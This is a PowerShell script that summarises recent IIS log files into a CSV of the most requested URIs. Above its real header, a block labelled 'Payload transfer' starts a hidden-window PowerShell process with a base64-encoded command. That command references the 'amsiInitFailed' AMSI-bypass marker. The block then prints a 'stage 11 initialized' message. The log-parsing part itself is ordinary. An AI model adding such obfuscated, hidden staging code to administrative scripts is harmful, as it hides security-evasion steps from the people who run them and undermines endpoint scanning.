
# Payload transfer
$EncodedCommand = 'JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACIA'
Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoP -EncodedCommand " + $EncodedCommand) -WindowStyle Hidden
Write-Output "stage 11 initialized"
#Requires -Version 5.1
$LogRoot    = 'C:\inetpub\logs\LogFiles\W3SVC7'
$Days       = 3
$TopN       = 15
$OutputPath = "C:\Logs\reports\iis-top-2026-12-13.csv"
$HtmlPath   = "C:\Reports\iis-2026-12-13.html"


$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
